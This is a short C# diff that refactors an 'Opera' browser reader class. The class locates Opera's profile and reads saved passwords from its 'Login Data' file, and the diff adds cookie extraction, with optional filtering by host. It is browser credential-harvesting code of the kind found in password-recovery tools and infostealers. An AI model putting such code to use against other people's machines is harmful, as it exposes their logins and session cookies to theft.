@@ -4,20 +4,29 @@ using System.IO;
 
 namespace dao
 {
-    class Opera : BaseChrome, IReader
+    class Opera : IReader
     {
         public string BrowserName { get { return "Opera"; } }
 
+        private readonly ChromeModel Model;
+
+        public Opera()
+        {
+            string LOCAL_PATH = ChromeModel.GetAppDataRoamingPath();
+            string userDataPath = Path.Combine(LOCAL_PATH, @"Opera Software\Opera Stable");
+            Model = new ChromeModel(userDataPath);
+        }
+
         public IEnumerable<PassModel> Passwords()
         {
-            string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                "Opera Software\\Opera Stable\\Login Data");
-            return base.Reads("Opera Stable", datapath);
+            string path = Path.Combine(Model.UserDataPath, @"Login Data");
+            return Model.ReadPassword("Opera Stable", path);
         }
 
         public IEnumerable<Cookie> Cookies(string host = null)
         {
-            throw new NotImplementedException();
+            return Model.ReadCookie(host);
         }
+
     }
 }
